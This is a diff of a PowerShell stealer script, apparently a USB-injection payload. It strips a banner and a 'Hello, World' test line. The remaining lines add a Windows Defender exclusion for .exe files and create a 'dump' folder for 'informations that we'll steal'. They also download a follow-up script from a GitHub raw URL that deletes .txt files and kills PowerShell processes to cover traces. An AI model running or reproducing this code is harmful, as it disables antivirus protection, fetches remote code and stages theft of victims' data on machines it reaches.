@@ -2,16 +2,7 @@ Set-Location C:\Users\Public\
 #Go to the folder in which we will download files
 Add-MpPreference -ExclusionExtension exe -Force 
 #Add exception for .exe files in antivirus
-mkdir dump 
-
-REM                      _                        
-REM  _   _  ___  _   _  | | ___ __   _____      __
-REM | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
-REM | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
-REM  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
-REM  |___/                                    
-STRING powershell "echo 'Hello, World!'; pause"
-
+mkdir dump
 #Create dump/ directory to put all informations that we'll steal in it
 Invoke-WebRequest https://raw.githubusercontent.com/PFranck06/HowardTelegram/main/fin_upload.ps1 -OutFile fin_upload.ps1 
 #Download final .ps1 file to delete all .txt files and stop all powershell process
